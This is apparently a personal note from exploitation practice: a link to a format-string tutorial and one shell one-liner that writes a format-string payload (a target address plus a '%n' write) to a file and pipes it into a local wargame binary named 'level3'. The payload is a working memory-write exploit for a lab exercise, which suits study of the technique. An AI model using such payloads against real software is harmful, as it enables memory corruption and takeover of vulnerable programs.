https://axcheron.github.io/exploit-101-format-strings/

python -c 'print("\x8c\x98\x04\x08%60x%4$n")' > /tmp/level3.txt; cat /tmp/level3.txt - | ./level3
